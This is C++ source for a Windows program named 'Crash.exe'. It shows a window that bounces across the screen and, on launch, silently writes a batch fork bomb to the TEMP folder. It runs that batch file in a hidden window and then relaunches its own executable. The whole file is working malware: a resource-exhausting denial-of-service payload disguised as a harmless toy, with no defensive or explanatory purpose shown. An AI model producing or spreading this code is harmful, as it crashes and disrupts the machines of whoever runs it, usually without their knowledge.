#define IDI_ICON 101
#include <fstream>
#include <iostream>
#include <string>
#include <cstdlib>
#include <windows.h>
#include <filesystem>
#include <wingdi.h>

using namespace std;
namespace fs = std::filesystem;

const char g_szClassName[] = "myWindowClass";
HWND hwndMain;
HBITMAP hBitmap;

int windowX = 0;
int windowY = 0;
int windowWidth = 480;
int windowHeight = 320;
int speedX = 5;
int speedY = 5;

#define WM_USER_EXECUTE (WM_USER + 1)

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

BOOL RegisterWindowClass(HINSTANCE hInstance);

BOOL CreateMainWindow(HINSTANCE hInstance);

int execute(char *argv[]);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    if (!RegisterWindowClass(hInstance))
        return 1;

    if (!CreateMainWindow(hInstance))
        return 1;

    PostMessage(hwndMain, WM_USER_EXECUTE, 0, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) != 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return msg.wParam;
}

BOOL CreateMainWindow(HINSTANCE hInstance)
{
    hwndMain = CreateWindowEx(
        0,
        g_szClassName,
        "Crash.exe",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, windowWidth, windowHeight,
        NULL, NULL, hInstance, NULL);

    if (hwndMain == NULL)
    {
        MessageBox(NULL, "Window Creation Failed!", "Error!", MB_ICONEXCLAMATION | MB_OK);
        return FALSE;
    }

    SetTimer(hwndMain, 1, 10, NULL);

    ShowWindow(hwndMain, SW_SHOWNORMAL);
    UpdateWindow(hwndMain);

    return TRUE;
}

BOOL RegisterWindowClass(HINSTANCE hInstance)
{
    WNDCLASSEX wc;
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.style = 0;
    wc.lpfnWndProc = WndProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hInstance = hInstance;
    wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON));
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszMenuName = NULL;
    wc.lpszClassName = g_szClassName;
    wc.hIconSm = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON));

    if (!RegisterClassEx(&wc))
    {
        MessageBox(NULL, "Window Registration Failed!", "Error!", MB_ICONEXCLAMATION | MB_OK);
        return FALSE;
    }

    return TRUE;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch (msg)
    {
    case WM_CLOSE:
        DestroyWindow(hwnd);
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    case WM_TIMER:
        windowX += speedX;
        windowY += speedY;

        if (windowX <= 0 || windowX + windowWidth >= GetSystemMetrics(SM_CXSCREEN))
            speedX = -speedX;
        if (windowY <= 0 || windowY + windowHeight >= GetSystemMetrics(SM_CYSCREEN))
            speedY = -speedY;
        SetWindowPos(hwnd, HWND_TOP, windowX, windowY, windowWidth, windowHeight, 0);
        break;

    case WM_KEYDOWN:

        switch (wParam)
        {
        case VK_UP:
            windowY -= 10;
            break;
        case VK_DOWN:
            windowY += 10;
            break;
        case VK_LEFT:
            windowX -= 10;
            break;
        case VK_RIGHT:
            windowX += 10;
            break;
        }
        SetWindowPos(hwnd, HWND_TOP, windowX, windowY, windowWidth, windowHeight, 0);
        break;
    case WM_USER_EXECUTE:
        execute(__argv);
        break;
    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int execute(char *argv[])
{
    const char *tempPath = getenv("TEMP");
    string batchFilePath = std::string(tempPath) + "\\crash.bat";
    ofstream crashbat(batchFilePath);
    crashbat << ":a" << std::endl;
    crashbat << "%0|%0" << std::endl;
    crashbat << "goto a";
    crashbat.close();

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    string command = "cmd.exe /c \"" + batchFilePath + "\"";
    if (!CreateProcess(NULL, (LPSTR)command.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        DWORD dwError = GetLastError();
        char errorMsg[256];
        sprintf(errorMsg, "CreateProcess failed with error %lu\n", dwError);
        OutputDebugString(errorMsg);
    }
    else
    {
        OutputDebugString("CreateProcess succeeded\n");
    }

    fs::path currentPath = fs::canonical(fs::path(argv[0])).parent_path();
    string fullPath = currentPath.string() + "\\crash.exe";

    CreateProcess(NULL, (LPSTR)fullPath.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    DWORD dwError = GetLastError();
    char errorMsg[256];
    sprintf(errorMsg, "CreateProcess failed with error %lu\n", dwError);
    OutputDebugString(errorMsg);

    return 0;
}
